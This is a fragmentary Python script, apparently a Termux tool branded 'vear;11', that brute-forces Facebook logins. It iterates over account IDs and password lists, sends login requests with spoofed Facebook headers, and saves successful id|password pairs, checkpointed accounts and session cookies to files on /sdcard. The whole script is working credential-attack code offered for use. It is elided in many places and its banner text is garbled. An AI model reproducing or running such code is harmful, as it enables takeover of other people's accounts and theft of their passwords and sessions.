...
print('\n\033[1;37m install modules...ðŸ¦‚ðŸ‘¹')
...
\033[1;96m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\033[1;31mvear;11\33[38;5;196mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:vear;11
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mvear;11\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'x-fb-request-id': 'AL_EdsFFa_nxfoTp5QpWmDL',
    'x-fb-trace-id': 'CIvYnuVExbk',
    'x-fb-rev': '1008054523',
    'x-fb-debug': '0x7MUnCv6JnBx9AE/hQ1Y7D+d3xrDzZ9Q1/Qo2tJn4E0ly1Rg7k+6XNBnkg8TAtqND263TqjKuY+Q9n/PICWmw==',
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [vear;11-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [vear;11-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [vear;11] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [vear;11-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/vear;11-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [vear;11-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/vear;11-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/vear;112CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [vear;11-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/vear;11-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/vear;11_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
